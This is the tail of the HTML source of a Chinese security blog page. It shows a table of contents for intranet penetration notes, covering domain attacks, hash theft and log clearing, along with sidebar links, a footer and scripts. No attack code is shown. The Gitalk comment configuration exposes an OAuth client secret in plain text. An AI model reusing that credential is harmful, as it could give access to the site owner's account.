class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.</span> <span class="toc-text">内网常见攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MS17-010%E7%AD%89"><span class="toc-number">1.9.1.</span> <span class="toc-text">MS17-010等</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.9.2.</span> <span class="toc-text">网络设备漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB"><span class="toc-number">1.9.3.</span> <span class="toc-text">钓鱼攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">1.10.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.10.1.</span> <span class="toc-text">本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8cmd%E6%8C%87%E4%BB%A4"><span class="toc-number">1.10.1.1.</span> <span class="toc-text">常用cmd指令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.10.1.2.</span> <span class="toc-text">查看域信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B9%A0%E6%83%AF"><span class="toc-number">1.10.1.3.</span> <span class="toc-text">用户习惯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="toc-number">1.10.1.4.</span> <span class="toc-text">密码收集</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E6%94%BB%E5%87%BB"><span class="toc-number">1.10.2.</span> <span class="toc-text">域控攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MS14-068"><span class="toc-number">1.10.2.1.</span> <span class="toc-text">MS14-068</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS14-025"><span class="toc-number">1.10.2.2.</span> <span class="toc-text">MS14-025</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pass-the-Hash"><span class="toc-number">1.10.2.3.</span> <span class="toc-text">Pass the Hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ntml-Hash%E8%8E%B7%E5%8F%96"><span class="toc-number">1.10.2.4.</span> <span class="toc-text">Ntml Hash获取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">1.10.3.</span> <span class="toc-text">域权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.10.4.</span> <span class="toc-text">域信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">1.11.</span> <span class="toc-text">痕迹清除</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%97%A5%E5%BF%97"><span class="toc-number">1.11.1.</span> <span class="toc-text">Linux日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E6%97%A5%E5%BF%97"><span class="toc-number">1.11.2.</span> <span class="toc-text">Web日志</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%E6%97%A5%E5%BF%97"><span class="toc-number">1.11.2.1.</span> <span class="toc-text">Apache日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS%E6%97%A5%E5%BF%97"><span class="toc-number">1.11.2.2.</span> <span class="toc-text">IIS日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E6%97%A5%E5%BF%97"><span class="toc-number">1.11.3.</span> <span class="toc-text">Windows日志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E5%8D%93%E8%B6%8A%E7%8F%AD"><span class="toc-number">2.</span> <span class="toc-text">垃圾卓越班</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/27/First%20price%20at%20CISCN2022!/" title="First price at CISCN2022!">First price at CISCN2022!</a><time datetime="2022-08-27T09:43:54.000Z" title="发表于 2022-08-27 17:43:54">2022-08-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/14/DEFCON2022/" title="DEFCON2022 at straw hat">DEFCON2022 at straw hat</a><time datetime="2022-08-14T10:51:23.000Z" title="发表于 2022-08-14 18:51:23">2022-08-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/13/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/" title="内网渗透笔记">内网渗透笔记</a><time datetime="2022-07-13T02:58:41.000Z" title="发表于 2022-07-13 10:58:41">2022-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/10/09/2021%E9%A2%86%E8%88%AA%E6%9D%AF/" title="2021领航杯 &amp; 蚌埠住了">2021领航杯 &amp; 蚌埠住了</a><time datetime="2021-10-09T15:09:20.000Z" title="发表于 2021-10-09 23:09:20">2021-10-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/06/26/AWD%E6%A1%86%E6%9E%B6/" title="AWD框架">AWD框架</a><time datetime="2021-06-26T11:42:06.000Z" title="发表于 2021-06-26 19:42:06">2021-06-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/top_img.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Dawn_whisper</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', '', 'katex-wrap')
  })
})()</script><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk({
      clientID: 'b9d4bee4e56c45722c3e',
      clientSecret: '6262041849967331fba83dec0387697b1f6ec9a7',
      repo: 'blog-comments',
      owner: 'dawnwhisper',
      admin: ['dawnwhisper'],
      id: '6f05df0f19658e42cf6b59df3d6d645e',
      language: 'zh-CN',
      perPage: 10,
      distractionFreeMode: true,
      pagerDirection: 'last',
      createIssueManually: true,
      updateCountCallback: commentCount
    })
    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !true) {
  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>